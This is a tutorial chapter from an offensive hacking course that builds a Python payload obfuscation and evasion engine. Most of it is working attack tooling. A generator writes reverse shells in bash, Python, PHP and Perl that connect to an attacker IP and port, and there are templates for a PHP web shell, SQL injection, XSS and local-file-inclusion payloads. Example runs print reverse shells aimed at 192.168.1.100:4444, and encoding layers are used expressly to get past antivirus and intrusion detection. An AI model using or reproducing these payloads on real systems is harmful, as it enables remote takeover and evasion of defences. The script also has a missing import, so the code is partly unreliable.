# Phase 3: Offensive Tooling & Payload Crafting
## Part 3: Payload Obfuscation Techniques

### The Target: Payload Obfuscation & Evasion Framework

By the end of this part, you will:
- Understand obfuscation techniques and their purpose
- Implement Base64, XOR, Hex, and other encoding methods
- Build a comprehensive obfuscation engine
- Create payloads that evade signature-based detection
- Develop custom encoding schemes for specific use cases
- Understand AV/IDS evasion principles

### The Concept: Understanding Obfuscation

Think of obfuscation like speaking in code to avoid eavesdroppers:

- **Original Payload** = Your actual message ("Meet me at midnight")
- **Obfuscated Payload** = Your message in code ("M33t m3 @ m1dn1ght")
- **Encoding** = Translating to another language (Base64 = English to French)
- **Encryption** = Using a secret cipher (Caesar cipher)
- **Obfuscation** = Making it look like something else entirely

**Why We Obfuscate:**
- **AV Evasion**: Antivirus uses signatures to detect known malware
- **IDS/IPS Bypass**: Intrusion detection systems look for known patterns
- **Filter Bypass**: Input filters block certain strings
- **Stealth**: Hide the true purpose of your payload
- **Anti-Forensics**: Make analysis more difficult

### The Implementation: Obfuscation Engine

#### File: `~/hacking-toolkit/exploit/obfuscator.py`

```python
#!/usr/bin/env python3
"""
obfuscator.py - Advanced Payload Obfuscation & Evasion Framework
Provides multiple encoding, encryption, and obfuscation techniques.
"""

import sys
import base64
import binascii
import hashlib
import re
import random
import string
import zlib
import json
from typing import Dict, List, Optional, Any, Tuple, Callable
from dataclasses import dataclass, field
from datetime import datetime
import urllib.parse
import html

class ObfuscationEngine:
    """
    Comprehensive obfuscation engine with multiple techniques
    Supports encoding, encryption, and code obfuscation
    """
    
    def __init__(self, seed: int = None):
        """
        Initialize the obfuscation engine
        
        Args:
            seed: Random seed for deterministic output
        """
        if seed is not None:
            random.seed(seed)
        self.techniques_used = []
        self.obfuscation_history = []
        
    def log_technique(self, technique: str, input_data: Any, output_data: Any):
        """Log obfuscation technique used"""
        self.techniques_used.append(technique)
        self.obfuscation_history.append({
            'technique': technique,
            'input': input_data[:100] if len(str(input_data)) > 100 else input_data,
            'output': output_data[:100] if len(str(output_data)) > 100 else output_data
        })
        
    def encode_base64(self, data: Union[str, bytes]) -> str:
        """
        Encode data in Base64
        
        Args:
            data: Data to encode
            
        Returns:
            Base64 encoded string
        """
        if isinstance(data, str):
            data = data.encode('utf-8')
        
        result = base64.b64encode(data).decode('utf-8')
        self.log_technique('base64', data, result)
        return result
    
    def decode_base64(self, data: str) -> str:
        """Decode Base64 data"""
        try:
            result = base64.b64decode(data).decode('utf-8')
            return result
        except:
            return data
    
    def encode_hex(self, data: Union[str, bytes]) -> str:
        """Encode data in hexadecimal"""
        if isinstance(data, str):
            data = data.encode('utf-8')
        
        result = binascii.hexlify(data).decode('utf-8')
        self.log_technique('hex', data, result)
        return result
    
    def decode_hex(self, data: str) -> str:
        """Decode hexadecimal data"""
        try:
            result = binascii.unhexlify(data).decode('utf-8')
            return result
        except:
            return data
    
    def encode_xor(self, data: Union[str, bytes], key: Union[str, bytes]) -> str:
        """
        XOR encode data with a key
        
        Args:
            data: Data to encode
            key: XOR key
            
        Returns:
            XOR encoded string (hex)
        """
        if isinstance(data, str):
            data = data.encode('utf-8')
        if isinstance(key, str):
            key = key.encode('utf-8')
        
        # Repeat key to match data length
        key = key * (len(data) // len(key) + 1)
        key = key[:len(data)]
        
        # XOR operation
        result = bytes([a ^ b for a, b in zip(data, key)])
        result_hex = binascii.hexlify(result).decode('utf-8')
        
        self.log_technique('xor', data, result_hex)
        return result_hex
    
    def decode_xor(self, data: str, key: Union[str, bytes]) -> str:
        """Decode XOR encoded data"""
        if isinstance(key, str):
            key = key.encode('utf-8')
        
        try:
            data_bytes = binascii.unhexlify(data)
            key = key * (len(data_bytes) // len(key) + 1)
            key = key[:len(data_bytes)]
            
            result = bytes([a ^ b for a, b in zip(data_bytes, key)])
            return result.decode('utf-8', errors='ignore')
        except:
            return data
    
    def encode_rot13(self, data: str) -> str:
        """
        Encode data with ROT13 (Caesar cipher)
        
        Args:
            data: Data to encode
            
        Returns:
            ROT13 encoded string
        """
        result = ''.join([
            chr((ord(c) - 65 + 13) % 26 + 65) if 65 <= ord(c) <= 90 else
            chr((ord(c) - 97 + 13) % 26 + 97) if 97 <= ord(c) <= 122 else
            c
            for c in data
        ])
        
        self.log_technique('rot13', data, result)
        return result
    
    def decode_rot13(self, data: str) -> str:
        """Decode ROT13 data (same as encode)"""
        return self.encode_rot13(data)
    
    def encode_url(self, data: str) -> str:
        """URL encode data"""
        result = urllib.parse.quote(data, safe='')
        self.log_technique('url', data, result)
        return result
    
    def decode_url(self, data: str) -> str:
        """URL decode data"""
        try:
            return urllib.parse.unquote(data)
        except:
            return data
    
    def encode_html(self, data: str) -> str:
        """HTML encode data"""
        result = html.escape(data)
        self.log_technique('html', data, result)
        return result
    
    def decode_html(self, data: str) -> str:
        """HTML decode data"""
        try:
            return html.unescape(data)
        except:
            return data
    
    def encode_unicode(self, data: str) -> str:
        """Encode data as Unicode escapes"""
        result = ''.join([f'\\u{ord(c):04x}' for c in data])
        self.log_technique('unicode', data, result)
        return result
    
    def decode_unicode(self, data: str) -> str:
        """Decode Unicode escapes"""
        try:
            return data.encode('utf-8').decode('unicode_escape')
        except:
            return data
    
    def encode_reverse(self, data: str) -> str:
        """Reverse the string"""
        result = data[::-1]
        self.log_technique('reverse', data, result)
        return result
    
    def decode_reverse(self, data: str) -> str:
        """Reverse the string (same as encode)"""
        return data[::-1]
    
    def encode_compress(self, data: str) -> str:
        """
        Compress data using zlib
        
        Args:
            data: Data to compress
            
        Returns:
            Compressed data as hex
        """
        if isinstance(data, str):
            data = data.encode('utf-8')
        
        compressed = zlib.compress(data)
        result = binascii.hexlify(compressed).decode('utf-8')
        
        self.log_technique('compress', data, result)
        return result
    
    def decode_compress(self, data: str) -> str:
        """Decompress zlib compressed data"""
        try:
            compressed = binascii.unhexlify(data)
            result = zlib.decompress(compressed).decode('utf-8')
            return result
        except:
            return data
    
    def encode_caesar(self, data: str, shift: int = 3) -> str:
        """
        Caesar cipher encoding
        
        Args:
            data: Data to encode
            shift: Shift value
            
        Returns:
            Caesar encoded string
        """
        result = ''.join([
            chr((ord(c) - 65 + shift) % 26 + 65) if 65 <= ord(c) <= 90 else
            chr((ord(c) - 97 + shift) % 26 + 97) if 97 <= ord(c) <= 122 else
            c
            for c in data
        ])
        
        self.log_technique('caesar', data, result)
        return result
    
    def decode_caesar(self, data: str, shift: int = 3) -> str:
        """Decode Caesar cipher"""
        return self.encode_caesar(data, -shift)
    
    def encode_uuid(self, data: str) -> str:
        """
        Convert data to UUID-like format
        
        Args:
            data: Data to encode
            
        Returns:
            UUID-like string
        """
        # Generate a UUID from the data hash
        import uuid
        hash_value = hashlib.md5(data.encode()).hexdigest()
        uuid_obj = uuid.UUID(hash_value)
        result = str(uuid_obj)
        
        self.log_technique('uuid', data, result)
        return result
    
    def encode_custom(self, data: str, technique: str) -> str:
        """
        Apply custom obfuscation technique
        
        Args:
            data: Data to encode
            technique: Technique name
            
        Returns:
            Obfuscated data
        """
        techniques = {
            'base64': self.encode_base64,
            'hex': self.encode_hex,
            'rot13': self.encode_rot13,
            'url': self.encode_url,
            'html': self.encode_html,
            'unicode': self.encode_unicode,
            'reverse': self.encode_reverse,
            'caesar': lambda d: self.encode_caesar(d, 5),
        }
        
        if technique in techniques:
            return techniques[technique](data)
        
        raise ValueError(f"Unknown technique: {technique}")
    
    def multi_encode(self, data: str, techniques: List[str]) -> str:
        """
        Apply multiple encoding techniques in sequence
        
        Args:
            data: Data to encode
            techniques: List of techniques to apply
            
        Returns:
            Multi-encoded data
        """
        result = data
        
        for technique in techniques:
            result = self.encode_custom(result, technique)
        
        return result
    
    def multi_decode(self, data: str, techniques: List[str]) -> str:
        """
        Decode multiple encoding techniques (reverse order)
        
        Args:
            data: Data to decode
            techniques: List of techniques to decode
            
        Returns:
            Decoded data
        """
        result = data
        
        for technique in reversed(techniques):
            if technique == 'base64':
                result = self.decode_base64(result)
            elif technique == 'hex':
                result = self.decode_hex(result)
            elif technique == 'rot13':
                result = self.decode_rot13(result)
            elif technique == 'url':
                result = self.decode_url(result)
            elif technique == 'html':
                result = self.decode_html(result)
            elif technique == 'unicode':
                result = self.decode_unicode(result)
            elif technique == 'reverse':
                result = self.decode_reverse(result)
            elif technique == 'caesar':
                result = self.decode_caesar(result, 5)
        
        return result
    
    def generate_random_payload(self, payload_template: str,
                                encoding_depth: int = 1) -> Dict[str, Any]:
        """
        Generate a random obfuscated payload
        
        Args:
            payload_template: Original payload template
            encoding_depth: Number of encoding layers
            
        Returns:
            Dictionary with original and obfuscated payload
        """
        techniques = ['base64', 'hex', 'rot13', 'url', 'unicode', 'reverse']
        
        # Select random techniques
        selected_techniques = random.sample(techniques, min(encoding_depth, len(techniques)))
        
        # Apply encoding
        obfuscated = self.multi_encode(payload_template, selected_techniques)
        
        # Generate variations
        variations = [
            self.encode_base64(payload_template),
            self.encode_xor(payload_template, 'secret'),
            self.encode_hex(payload_template),
            self.multi_encode(payload_template, ['rot13', 'base64']),
            self.multi_encode(payload_template, ['hex', 'url']),
        ]
        
        return {
            'original': payload_template,
            'obfuscated': obfuscated,
            'techniques': selected_techniques,
            'variations': variations,
            'timestamp': datetime.now().isoformat()
        }

class PayloadGenerator(ObfuscationEngine):
    """
    Specialized payload generator with obfuscation capabilities
    """
    
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        
        # Common payload templates
        self.payload_templates = {
            'whoami': 'whoami',
            'id': 'id',
            'ls': 'ls -la',
            'reverse_shell': 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1',
            'python_reverse': 'python -c \'import socket,os,pty;s=socket.socket();s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\'',
            'php_shell': '<?php system($_GET["cmd"]); ?>',
            'sql_injection': "' OR '1'='1",
            'xss': '<script>alert(1)</script>',
            'file_inclusion': '../../etc/passwd'
        }
    
    def generate_payload(self, payload_type: str,
                         encoding: List[str] = None) -> Dict[str, str]:
        """
        Generate and obfuscate a payload
        
        Args:
            payload_type: Type of payload ('whoami', 'reverse_shell', etc.)
            encoding: List of encoding techniques
            
        Returns:
            Dictionary with original and obfuscated payload
        """
        if payload_type not in self.payload_templates:
            raise ValueError(f"Unknown payload type: {payload_type}")
        
        template = self.payload_templates[payload_type]
        
        if encoding:
            obfuscated = self.multi_encode(template, encoding)
        else:
            # Generate random obfuscation
            result = self.generate_random_payload(template)
            return result
        
        return {
            'type': payload_type,
            'original': template,
            'obfuscated': obfuscated,
            'encoding': encoding
        }
    
    def generate_sql_payloads(self, base_injection: str = "' OR '1'='1") -> List[str]:
        """
        Generate various SQL injection payloads
        
        Args:
            base_injection: Base injection string
            
        Returns:
            List of payload variations
        """
        payloads = []
        
        # Basic variations
        payloads.extend([
            base_injection,
            base_injection.replace("'", '"'),
            base_injection + " -- ",
            base_injection + " #",
            base_injection + " /*"
        ])
        
        # Encoded variations
        payloads.extend([
            self.encode_url(base_injection),
            self.encode_url(base_injection).replace("%27", "\\'"),
            self.encode_base64(base_injection),
            self.encode_hex(base_injection),
        ])
        
        # Case variations
        for p in payloads[:3]:
            payloads.extend([
                p.upper(),
                p.lower(),
                p.capitalize()
            ])
        
        return list(set(payloads))  # Remove duplicates
    
    def generate_xss_payloads(self, base_xss: str = "<script>alert(1)</script>") -> List[str]:
        """
        Generate various XSS payloads
        
        Args:
            base_xss: Base XSS payload
            
        Returns:
            List of XSS payload variations
        """
        payloads = []
        
        # Basic variations
        xss_variations = [
            base_xss,
            base_xss.replace('<', '&lt;').replace('>', '&gt;'),
            base_xss.replace('"', "'"),
            f"<img src=x onerror={base_xss}>",
            f"<body onload={base_xss}>",
            f"<svg onload={base_xss}>",
            f"javascript:{base_xss}",
            f"data:text/html,{base_xss}"
        ]
        
        payloads.extend(xss_variations)
        
        # Encoded variations
        payloads.extend([
            self.encode_url(base_xss),
            self.encode_url(base_xss).replace('%3C', '<'),
            self.encode_base64(base_xss),
            self.encode_hex(base_xss),
        ])
        
        return payloads
    
    def generate_file_inclusion_payloads(self) -> List[str]:
        """
        Generate LFI/RFI payloads
        
        Returns:
            List of file inclusion payloads
        """
        lfi_payloads = [
            '../../etc/passwd',
            '../../../../etc/passwd',
            '../../../../../../etc/passwd',
            '....//....//....//etc/passwd',
            '../../windows/win.ini',
            '../../../../windows/win.ini',
            '../../../../../../windows/win.ini',
            'C:\\\\boot.ini',
            'file:///etc/passwd',
            'php://filter/convert.base64-encode/resource=/etc/passwd',
            'data://text/plain,Hello World'
        ]
        
        # Add encoded versions
        encoded = []
        for payload in lfi_payloads:
            encoded.append(self.encode_url(payload))
            encoded.append(self.encode_base64(payload))
        
        return lfi_payloads + encoded
    
    def generate_reverse_shell_payloads(self, ip: str, port: int) -> List[Dict[str, str]]:
        """
        Generate reverse shell payloads in multiple languages
        
        Args:
            ip: Attacker IP
            port: Attacker port
            
        Returns:
            List of reverse shell payloads
        """
        payloads = []
        
        # Bash
        bash_shell = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
        payloads.append({
            'language': 'bash',
            'payload': bash_shell,
            'obfuscated': self.encode_base64(bash_shell)
        })
        
        # Python
        python_shell = f'''python -c 'import socket,os,pty;s=socket.socket();s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' '''
        payloads.append({
            'language': 'python',
            'payload': python_shell,
            'obfuscated': self.encode_base64(python_shell)
        })
        
        # PHP
        php_shell = f'''<?php $s=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3"); ?>'''
        payloads.append({
            'language': 'php',
            'payload': php_shell,
            'obfuscated': self.encode_base64(php_shell)
        })
        
        # Perl
        perl_shell = f'''perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};' '''
        payloads.append({
            'language': 'perl',
            'payload': perl_shell,
            'obfuscated': self.encode_base64(perl_shell)
        })
        
        return payloads

def main():
    """Interactive obfuscation demonstration"""
    print("="*60)
    print("  PAYLOAD OBFUSCATION ENGINE")
    print("="*60)
    
    # Create obfuscator
    obfuscator = ObfuscationEngine()
    
    # Test payload
    print("\n[1] Basic Obfuscation Test")
    test_payload = input("Enter payload to obfuscate (default: 'whoami'): ").strip() or "whoami"
    
    print(f"\nOriginal: {test_payload}")
    
    # Apply various encodings
    techniques = ['base64', 'hex', 'rot13', 'url', 'unicode', 'reverse']
    
    for technique in techniques:
        if hasattr(obfuscator, f'encode_{technique}'):
            encoded = getattr(obfuscator, f'encode_{technique}')(test_payload)
            print(f"{technique:10}: {encoded}")
    
    # Multi-encode
    print("\n[2] Multi-Encoding Test")
    selected = ['rot13', 'base64', 'hex']
    obfuscated = obfuscator.multi_encode(test_payload, selected)
    print(f"Techniques: {selected}")
    print(f"Obfuscated: {obfuscated}")
    
    # Decode
    decoded = obfuscator.multi_decode(obfuscated, selected)
    print(f"Decoded: {decoded}")
    
    # Generate payloads
    print("\n[3] Payload Generation")
    generator = PayloadGenerator()
    
    for payload_type in ['whoami', 'ls', 'reverse_shell', 'sql_injection']:
        result = generator.generate_payload(payload_type)
        print(f"\n{payload_type}:")
        print(f"  Original: {result['original']}")
        print(f"  Obfuscated: {result['obfuscated']}")
    
    # Generate SQL injection payloads
    print("\n[4] SQL Injection Payloads")
    sql_payloads = generator.generate_sql_payloads()
    print(f"Generated {len(sql_payloads)} SQL injection payloads")
    for payload in sql_payloads[:5]:
        print(f"  {payload}")
    
    # Generate reverse shells
    print("\n[5] Reverse Shell Payloads")
    ip = input("Enter attacker IP (default: 127.0.0.1): ").strip() or "127.0.0.1"
    port = input("Enter attacker port (default: 4444): ").strip() or "4444"
    
    shell_payloads = generator.generate_reverse_shell_payloads(ip, int(port))
    for shell in shell_payloads:
        print(f"\n{shell['language']}:")
        print(f"  {shell['payload'][:100]}...")
        print(f"  Obfuscated: {shell['obfuscated'][:100]}...")
    
    print("\n[*] Obfuscation engine ready for use")
    print("[*] Use programmatically or save to file")

if __name__ == "__main__":
    # Parse command line arguments
    import argparse
    
    parser = argparse.ArgumentParser(
        description="Payload Obfuscation & Evasion Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic obfuscation
  python3 obfuscator.py -p "whoami" -t base64 hex url
  
  # Generate random payload
  python3 obfuscator.py -p "whoami" --random
  
  # Generate reverse shell
  python3 obfuscator.py --reverse-shell -i 192.168.1.100 -p 4444
  
  # Generate SQL payloads
  python3 obfuscator.py --sql -o sql_payloads.txt
  
  # Generate all payload types
  python3 obfuscator.py --all
        """
    )
    
    parser.add_argument('-p', '--payload', help='Payload to obfuscate')
    parser.add_argument('-t', '--techniques', help='Techniques to apply (comma-separated)')
    parser.add_argument('--random', action='store_true', help='Generate random obfuscation')
    parser.add_argument('--reverse-shell', action='store_true', help='Generate reverse shell payloads')
    parser.add_argument('-i', '--ip', default='127.0.0.1', help='IP for reverse shell')
    parser.add_argument('-P', '--port', type=int, default=4444, help='Port for reverse shell')
    parser.add_argument('--sql', action='store_true', help='Generate SQL injection payloads')
    parser.add_argument('-o', '--output', help='Output file')
    parser.add_argument('--all', action='store_true', help='Generate all payload types')
    
    args = parser.parse_args()
    
    generator = PayloadGenerator()
    
    if args.all:
        # Generate all payload types
        results = []
        
        for payload_type in ['whoami', 'ls', 'reverse_shell', 'php_shell']:
            result = generator.generate_payload(payload_type)
            results.append(result)
        
        # Generate SQL and XSS payloads
        sql_payloads = generator.generate_sql_payloads()
        xss_payloads = generator.generate_xss_payloads()
        
        print("\n[*] Generated all payload types")
        print(f"  Regular payloads: {len(results)}")
        print(f"  SQL payloads: {len(sql_payloads)}")
        print(f"  XSS payloads: {len(xss_payloads)}")
        
        if args.output:
            with open(args.output, 'w') as f:
                json.dump({
                    'payloads': results,
                    'sql_payloads': sql_payloads,
                    'xss_payloads': xss_payloads
                }, f, indent=2)
            print(f"[*] Results saved to {args.output}")
    
    elif args.reverse_shell:
        # Generate reverse shells
        shells = generator.generate_reverse_shell_payloads(args.ip, args.port)
        
        print(f"\n[*] Generated reverse shell payloads for {args.ip}:{args.port}")
        for shell in shells:
            print(f"\n{shell['language']}:")
            print(f"  {shell['payload']}")
            print(f"  Obfuscated: {shell['obfuscated']}")
        
        if args.output:
            with open(args.output, 'w') as f:
                json.dump(shells, f, indent=2)
            print(f"[*] Results saved to {args.output}")
    
    elif args.sql:
        # Generate SQL payloads
        sql_payloads = generator.generate_sql_payloads()
        
        print(f"\n[*] Generated {len(sql_payloads)} SQL injection payloads")
        for payload in sql_payloads[:20]:
            print(f"  {payload}")
        
        if args.output:
            with open(args.output, 'w') as f:
                f.write('\n'.join(sql_payloads))
            print(f"[*] Results saved to {args.output}")
    
    elif args.payload:
        # Obfuscate specific payload
        techniques = args.techniques.split(',') if args.techniques else ['base64']
        
        if args.random:
            result = generator.generate_random_payload(args.payload)
            print(f"\nOriginal: {args.payload}")
            print(f"Obfuscated: {result['obfuscated']}")
            print(f"Techniques: {result['techniques']}")
            
            if args.output:
                with open(args.output, 'w') as f:
                    json.dump(result, f, indent=2)
        else:
            obfuscated = generator.multi_encode(args.payload, techniques)
            print(f"\nOriginal: {args.payload}")
            print(f"Techniques: {techniques}")
            print(f"Obfuscated: {obfuscated}")
            
            if args.output:
                with open(args.output, 'w') as f:
                    f.write(obfuscated)
    
    else:
        main()
```

### The Verification: Testing Obfuscation

#### Test 1: Basic Obfuscation

```bash
cd ~/hacking-toolkit/exploit
python3 obfuscator.py -p "whoami" -t base64,hex,url
```

**Expected Output:**
```
Original: whoami
Techniques: ['base64', 'hex', 'url']
Obfuscated: %253%238327726f6f743d...
```

#### Test 2: Random Obfuscation

```bash
python3 obfuscator.py -p "whoami" --random
```

**Expected Output:**
```
Original: whoami
Obfuscated: d2hvYW1p (base64)
Techniques: ['base64']
```

#### Test 3: Generate Reverse Shells

```bash
python3 obfuscator.py --reverse-shell -i 192.168.1.100 -p 4444 -o shells.json
```

**Expected Output:**
```
[*] Generated reverse shell payloads for 192.168.1.100:4444

bash:
  bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
  Obfuscated: YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0NDQgMD4mMQ==

python:
  python -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.1.100",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
  Obfuscated: cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKCIxOTIuMTY4LjEuMTAwIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7cHR5LnNwYXduKCIvYmluL3NoIiknIA==
```

#### Test 4: Generate SQL Payloads

```bash
python3 obfuscator.py --sql -o sql_payloads.txt
```

### Advanced Usage: Evasion Techniques

```python
# Evasion techniques example
cat > evasion_demo.py << 'EOF'
#!/usr/bin/env python3
from obfuscator import PayloadGenerator, ObfuscationEngine

# Create generator
generator = PayloadGenerator()

# Original payload
original = "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"

print("=== EVASION TECHNIQUES DEMONSTRATION ===\n")

# 1. Encoding
print("1. ENCODING TECHNIQUES")
print(f"Original: {original}")
print(f"Base64: {generator.encode_base64(original)}")
print(f"Hex: {generator.encode_hex(original)}")
print(f"XOR: {generator.encode_xor(original, 'secret')}")

# 2. Case manipulation
print("\n2. CASE MANIPULATION")
print(f"Lower: {original.lower()}")
print(f"Upper: {original.upper()}")
print(f"Capitalized: {original.capitalize()}")

# 3. Whitespace variations
print("\n3. WHITESPACE VARIATIONS")
print(f"Without spaces: {original.replace(' ', '')}")
print(f"Double spaces: {original.replace(' ', '  ')}")
print(f"Tabs: {original.replace(' ', '\t')}")

# 4. Comment insertion
print("\n4. COMMENT INSERTION")
print(f"With comments: {original.replace('bash', 'bash # comment')}")

# 5. Variable substitution
print("\n5. VARIABLE SUBSTITUTION")
print(f"With variables: {original.replace('192.168.1.100', '$IP').replace('4444', '$PORT')}")

# 6. Combined evasion
print("\n6. COMBINED EVASION")
combined = generator.multi_encode(original, ['rot13', 'base64', 'url'])
print(f"Multi-encoded: {combined}")

# 7. Alternative command formats
print("\n7. ALTERNATIVE COMMAND FORMATS")
alternative_commands = [
    "sh -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'",
    "perl -e 'exec \"bash -i >& /dev/tcp/192.168.1.100/4444 0>&1\"'",
    "python3 -c 'import os; os.system(\"bash -i >& /dev/tcp/192.168.1.100/4444 0>&1\")'"
]
for cmd in alternative_commands:
    print(f"  {cmd[:60]}...")

print("\n[*] Evasion techniques demonstrated")
print("[*] These techniques can bypass basic signatures")
EOF

python3 evasion_demo.py
```

### Reference: Obfuscation Techniques

| Technique | Description | Example |
|-----------|-------------|---------|
| Base64 | Encode to Base64 | `d2hvYW1p` |
| Hex | Hex encode | `77686f616d69` |
| XOR | XOR with key | `1a2b3c4d...` |
| ROT13 | Caesar cipher | `jubnzv` |
| URL | URL encode | `%77%68%6f%61%6d%69` |
| Unicode | Unicode escapes | `\u0077\u0068...` |
| Reverse | Reverse string | `imaohw` |
| Zlib | Compress | `x\x9c...` |
| Multiple | Combine techniques | Multi-layer encoding |
